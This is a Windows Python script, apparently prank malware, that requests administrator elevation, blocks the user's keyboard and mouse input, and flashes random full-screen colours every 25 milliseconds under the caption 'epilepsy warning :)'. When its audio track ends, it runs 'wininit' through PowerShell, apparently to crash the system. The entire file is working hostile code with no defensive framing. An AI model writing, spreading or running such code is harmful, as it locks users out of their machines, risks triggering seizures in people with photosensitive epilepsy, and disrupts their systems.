import pygame
import playsound
import random
import ctypes
from ctypes import wintypes
from time import sleep
import subprocess
import sys
ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
pygame.init()

MUSIC = "salinewin.wav"
screen = pygame.display.set_mode((1920,1200))
#pygame.display.toggle_fullscreen()
pygame.mixer_music.load(MUSIC)

font = pygame.font.Font("zhcn.ttf",80)
BlockInput = ctypes.windll.user32.BlockInput
BlockInput.argtypes = [wintypes.BOOL]
BlockInput.restype = wintypes.BOOL
BlockInput(True)


screen.fill((0,0,0))
txt = font.render("epilepsy warning :)",True,(50,50,50))
textRect = txt.get_rect()

textRect.center = (1920 // 2, 1200 // 2)
screen.blit(txt,textRect)
pygame.display.update()     
sleep(1)
pygame.mixer_music.play()
while True:
    if pygame.mixer_music.get_busy() == False:
        subprocess.call(["powershell","-Command","wininit"])
        break
    events = pygame.event.get()
    for e in events:
        if e == pygame.QUIT:

            break
    screen.fill((random.randint(0,255),random.randint(0,255),random.randint(0,255)))
    txt = font.render("epilepsy warning :)",True,(random.randint(0,255),random.randint(0,255),random.randint(0,255)))
    textRect = txt.get_rect()

    textRect.center = (random.randint(900,1020),random.randint(540,660))
    screen.blit(txt,textRect)
    pygame.display.update()
    sleep(0.025)

pygame.quit()